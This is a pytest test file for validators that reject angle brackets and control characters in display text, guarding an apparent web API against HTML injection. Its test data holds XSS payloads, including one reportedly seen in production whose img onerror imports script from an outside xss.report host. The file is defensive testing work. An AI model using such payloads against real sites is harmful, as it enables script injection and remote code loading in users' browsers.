"""Tests for the safe display-text validators (XSS / HTML-injection guard)."""

import pytest
from pydantic import BaseModel, ValidationError

from orchestra.web.api.utils.safe_text import (
    MAX_LABEL_LENGTH,
    MAX_TEXT_LENGTH,
    OptionalSafeLabel,
    OptionalSafeText,
    SafeLabel,
    SafeText,
    validate_safe_text,
)

# The actual payload that was injected into an organization name in production.
REAL_WORLD_PAYLOAD = (
    '"><h1>albus dumbledore</h1>'
    '<a href="https://cia.gov">Click Me</a>'
    "<img/src/onerror=import('//xss.report/c/a8x')>"
    "<Svg Only=1 OnLoad=confirm(document.domain)>"
    "<script>alert(document.domain)</script>"
)

XSS_SAMPLES = [
    REAL_WORLD_PAYLOAD,
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "plain < less than",
    "greater > than",
    "<",
    ">",
]


class TestValidateSafeText:
    """Unit tests for the core ``validate_safe_text`` function."""

    def test_none_passes_through(self):
        assert validate_safe_text(None) is None

    def test_strips_whitespace(self):
        assert validate_safe_text("  Acme Corp  ") == "Acme Corp"

    @pytest.mark.parametrize(
        "value",
        [
            "Acme Corp",
            "O'Brien & Sons (UK)",
            "Café Münchën 北京 🚀",
            "Team #1 — 50% off!",
            "a/b/c path-like_name",
        ],
    )
    def test_allows_normal_punctuation(self, value):
        assert validate_safe_text(value) == value

    @pytest.mark.parametrize("payload", XSS_SAMPLES)
    def test_rejects_angle_brackets(self, payload):
        with pytest.raises(ValueError, match="'<' or '>'"):
            validate_safe_text(payload)

    def test_rejects_empty_by_default(self):
        with pytest.raises(ValueError, match="must not be empty"):
            validate_safe_text("   ")

    def test_allows_empty_when_opted_in(self):
        assert validate_safe_text("   ", allow_empty=True) == ""

    def test_rejects_too_long(self):
        with pytest.raises(ValueError, match="at most"):
            validate_safe_text("x" * (MAX_LABEL_LENGTH + 1))

    def test_rejects_line_breaks_by_default(self):
        with pytest.raises(ValueError, match="line breaks"):
            validate_safe_text("line1\nline2")

    def test_allows_line_breaks_when_opted_in(self):
        value = "line1\nline2\twith tab"
        assert validate_safe_text(value, allow_newlines=True) == value

    def test_rejects_control_characters(self):
        with pytest.raises(ValueError, match="control characters"):
            validate_safe_text("bad\x00null")

    def test_rejects_control_chars_even_with_newlines_allowed(self):
        with pytest.raises(ValueError, match="control characters"):
            validate_safe_text("bad\x07bell", allow_newlines=True)


class _LabelModel(BaseModel):
    name: SafeLabel
    nick: OptionalSafeLabel = None


class _TextModel(BaseModel):
    summary: SafeText
    description: OptionalSafeText = None


class TestAnnotatedTypes:
    """Tests for the Annotated Pydantic aliases used in request schemas."""

    def test_safe_label_accepts_valid(self):
        model = _LabelModel(name="Acme Corp")
        assert model.name == "Acme Corp"
        assert model.nick is None

    def test_optional_safe_label_accepts_none(self):
        assert _LabelModel(name="Acme", nick=None).nick is None

    @pytest.mark.parametrize("payload", XSS_SAMPLES)
    def test_safe_label_rejects_xss(self, payload):
        with pytest.raises(ValidationError) as exc:
            _LabelModel(name=payload)
        assert exc.value.errors()[0]["loc"] == ("name",)

    @pytest.mark.parametrize("payload", XSS_SAMPLES)
    def test_optional_safe_label_rejects_xss(self, payload):
        with pytest.raises(ValidationError) as exc:
            _LabelModel(name="ok", nick=payload)
        assert exc.value.errors()[0]["loc"] == ("nick",)

    def test_safe_text_allows_multiline(self):
        value = "Line one\nLine two with & ampersand and 100% emphasis!"
        model = _TextModel(summary=value)
        assert model.summary == value

    def test_safe_text_rejects_html_in_multiline(self):
        with pytest.raises(ValidationError):
            _TextModel(summary="hello <svg onload=alert(1)>")

    def test_safe_text_respects_text_length(self):
        with pytest.raises(ValidationError):
            _TextModel(summary="x" * (MAX_TEXT_LENGTH + 1))
